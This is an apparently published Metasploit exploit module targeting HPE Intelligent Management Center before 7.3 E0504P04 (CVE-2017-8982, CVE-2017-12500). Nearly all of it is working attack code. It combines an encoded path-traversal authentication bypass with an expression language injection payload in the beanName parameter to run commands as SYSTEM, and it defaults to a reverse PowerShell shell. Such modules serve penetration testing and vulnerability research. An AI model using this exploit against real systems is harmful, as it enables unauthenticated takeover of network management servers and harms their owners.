##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HPE iMC EL Injection Unauthenticated RCE',
      'Description'    => %q{
        This module exploits an expression language injection vulnerablity, along with
        an authentication bypass vulnerability in Hewlett Packard Enterprise Intelligent
        Management Center before version 7.3 E0504P04 to achieve remote code execution.

        The HP iMC server suffers from multiple vulnerabilities allows unauthenticated
        attacker to execute arbitrary Expression Language via the beanName parameter, 
        allowing execution of arbitrary operating system commands as SYSTEM. This service
        listens on TCP port 8080 and 8443 by default.

        This module has been tested successfully on iMC PLAT v7.3 (E0504P02) on Windows
        2k12r2 x64 (EN).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'mr_me', # Discovery
          'trendytofu' # Metasploit
        ],
      'References'     =>
        [
          ['CVE', '2017-8982'],
          ['ZDI', '18-139'],
          ['URL', 'https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03809en_us'],
          ['CVE', '2017-12500'],
          ['ZDI', '17-663'],
          ['URL', 'https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03768en_us']
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_CMD,
      'Targets'        => [
                            [ 'Windows',
                              {
                                'Arch' => [ ARCH_CMD],
                                'Platform' => 'win'
                              }
                            ]
                          ],
      'Privileged'     => true,
      'DisclosureDate' => 'Jan 25 2018',
      'DefaultOptions' =>
        {
          'Payload' => 'cmd/windows/reverse_powershell'
        },
      'DefaultTarget'  => 0))
    register_options [Opt::RPORT(8080)]
  end

  def check
    res = send_request_raw({'uri'  => '/imc/login.jsf' })

    return CheckCode::Detected if res && res.code == 200

    CheckCode::Unknown
  end

  def get_payload(cmd)
    %q|facesContext.getExternalContext().redirect(%22%22.getClass().forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22JavaScript%22).eval(%22var%20proc=new%20java.lang.ProcessBuilder[%5C%22(java.lang.String[])%5C%22]([%5C%22cmd.exe%5C%22,%5C%22/c%5C%22,%5C%22|+cmd+%q|%5C%22]).start();%22))|
  end

  def execute_command(payload)
    res = send_request_raw({ 'uri' => "/imc/primepush/%2e%2e/ict/export/ictExpertDownload.xhtml?beanName=#{payload}" })
    fail_with(Msf::Module::Failure::UnexpectedReply, "Injection failed") if res && res.code != 302
    print_good "Command injected successfully!"
  end

  def exploit
    cmd = payload.encoded
    cmd.gsub!('cmd.exe /c ','')
    cmd = Rex::Text.uri_encode(cmd)

    print_status "Sending payload..."
    execute_command get_payload cmd
  end
end